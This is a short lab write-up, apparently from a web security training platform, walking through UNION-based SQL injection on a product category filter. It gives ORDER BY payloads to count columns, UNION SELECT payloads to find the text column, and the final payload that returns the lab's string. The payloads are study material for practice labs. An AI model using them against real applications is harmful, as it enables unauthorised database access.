#  SQL Injection: Finding a column containing text

**Lab Description:** The application allows SQL injection in the product category filter. The goal is to determine which column allows text data and retrieve a specific string provided by the database.

## 1. Reconnaissance
* **Goal:** Make the database retrieve the string: `'UH70bT'` (Note: This string changes every time).
* **Step 1: Determine number of columns**
  * Payload: `' ORDER BY 1--`, `' ORDER BY 2--`, `' ORDER BY 3--` (All Success).
  * Payload: `' ORDER BY 4--` (Error 500).
  * -> **Result:** 3 Columns

## 2. Exploitation Steps

### Step 1: Identify the Text Column
I need to find which column can hold string data. I tested each column with the letter `'a'`.
When doing this lab, I think it requires me to find table name containing given string. However, after 10 minutes, I can't find anything met my expect. Reading lab again, I realize it is easier than I think.

 **Payload 1 (Column 1):**
  ```sql
  ' UNION SELECT 'a', NULL, NULL--(error server)
  ```
  
  **Payload 2 (Column 2):**
  ```sql
  ' UNION SELECT NULL, 'a', NULL--(correct)
  ```
  
  **Payload 3 (column3):**
  ```sql
  ' UNION SELECT NULL, NULL, 'a'--(error)
  ```
  ### Step 2 Retrieve the Secret String:
  Replace 'a' with the secret string provided by the Lab (UH70bT).
  Final Payload:
  ```sql
  ' UNION SELECT NULL, 'UH70bT', NULL--
  ```
  ->DONE🚩
  
  
  
